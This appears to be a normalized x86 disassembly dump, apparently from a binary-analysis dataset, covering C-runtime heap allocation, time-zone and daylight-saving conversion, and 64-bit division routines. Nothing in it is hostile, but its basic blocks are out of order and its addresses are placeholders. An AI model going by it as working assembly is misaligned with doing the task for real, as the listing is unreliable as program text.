mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_42e631
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_42edaf
push 0xc
push r--data
call sub_42b398
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_425eb1
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_42b3dd
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_42e041
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_42eaca
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42eeab
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_42b5a0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_42ef19
push 0x8
push r--data
call sub_42b398
push [ rw-data ]
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
call sub_42eecd
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42ef62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_42b5a0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_425eb1
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_42fd00
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_428c70
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_428c70
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_42fd00
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_428c70
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_42fd00
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_42fd00
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_428c70
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_42fd00
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_42f1a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push edi
push 0x24
push 0xff
push esi
call sub_42b5a0
mov edi [ ebp + 0xc ]
add esp 0xc
cmp edi ebx
jne r-xdata
call sub_425eb1
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
mov ecx [ edi ]
jg r-xdata
call sub_425eb1
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
mov eax esi
jmp r-xdata
call sub_42fc68
lea eax [ ebp - 0x8 ]
push eax
call sub_42f45d
pop ecx
test eax eax
je r-xdata
jg r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
cmp ecx ebx
jb r-xdata
pop edi
lea eax [ ebp - 0xc ]
push eax
call sub_42f496
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_42f4cf
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx ebx
mov edi [ edi ]
jl r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
push eax
push esi
call sub_42ef62
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub edi eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] ecx
call sub_42ef62
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
cmp edi 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov edi eax
mov eax [ ebp - 0x4 ]
mov ebx edx
cdq
sub edi eax
sbb ebx edx
push esi
call sub_42fcb7
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_42fd00
mov edi eax
mov eax [ esi + 0x4 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x3c
adc ebx edx
push ebx
push edi
call sub_42fdb0
mov [ esi + 0x4 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi ] eax
adc ebx 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov edi eax
sub edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
sbb ebx ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_42fcb7
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_42fd00
mov edi eax
mov eax [ esi + 0x8 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_42fdb0
mov [ esi + 0x8 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi + 0x4 ] eax
adc ebx 0xffffffff
push 0x0
push 0x3c
push ebx
push edi
call sub_42fdb0
mov [ esi ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_42ef62
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push 0x0
push 0x18
push ebx
push edi
call sub_42fd00
mov ecx eax
test edx edx
jl r-xdata
add eax 0x18
add edi 0xffffffe8
mov [ esi + 0x8 ] eax
adc ebx 0xffffffff
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ esi + 0x18 ]
lea eax [ ecx + eax + 0x7 ]
cdq
push 0x7
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
mov [ esi + 0x18 ] edx
test eax eax
jg r-xdata
jg r-xdata
add [ esi + 0x1c ] ecx
add ecx 0x16d
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xb
jmp r-xdata
mov eax [ esi + 0x18 ]
add eax ecx
push 0x7
cdq
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov [ esi + 0x18 ] edx
test ecx ecx
jbe r-xdata
test edx edx
jg r-xdata
jl r-xdata
test ecx ecx
jae r-xdata
sub_42f45d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42f496
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42f4cf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_42f553
push 0x2c
push r--data
call sub_42b398
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_42f51a
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_42f4cf
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_42f45d
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_42f496
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
call sub_42629c
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_437ce2
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_424869
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_4258f0
inc eax
push eax
call sub_428905
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_42de10
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42b3dd
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_4258f0
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_42aae1
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_42f542
push [ ebp - 0x24 ]
call sub_42f520
push [ ebp - 0x28 ]
call sub_42f531
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f7ff
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
jmp r-xdata
push eax
call sub_424869
pop ecx
push esi
call sub_423a2d
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_423a2d
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_4318da
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_42f514
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_42f508
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423c0e
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_423a2d
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_42f899
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_42f496
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_42fa90
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_42f45d
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_42f899
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_42f899
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_42f899
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_42f899
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_42fc68
push 0x8
push r--data
call sub_42b398
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_42b3dd
retn
push 0x6
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42fcae
call sub_42f553
inc [ rw-data ]
sub_42fcb7
push 0xc
push r--data
call sub_42b398
push 0x6
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_42fa90
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42fcef
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
sub_42fd00
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
